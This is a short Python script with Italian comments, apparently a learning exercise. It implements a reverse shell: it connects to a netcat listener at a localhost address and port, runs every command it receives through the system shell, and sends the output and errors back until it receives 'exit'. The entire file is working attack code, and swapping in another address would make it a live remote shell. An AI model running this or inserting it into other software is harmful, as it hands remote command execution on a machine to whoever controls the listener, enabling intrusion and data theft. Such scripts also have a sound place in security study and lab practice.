import socket as so
import subprocess

# Specificare l'indirizzo e la porta di netcat che funge da server
NC_ADDR = "127.0.0.1"
NC_PORT = 44444

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((NC_ADDR, NC_PORT))                       #prima facevo il bind ora devo connettermi

while True:
    command = s.recv(1024).decode('utf-8')          #traduco da binario in una stringa
    if command == "exit":                           
        break
    output = subprocess.run(command, shell=True, capture_output=True)   #subprocess mi permette di lanciare comandi come se fosse il SO, con shell=true è come se mandassi i comandi da shell
    s.sendall(output.stdout + output.stderr)                            #prendo l'output e standard error e lo rimando come risposta 

s.close()
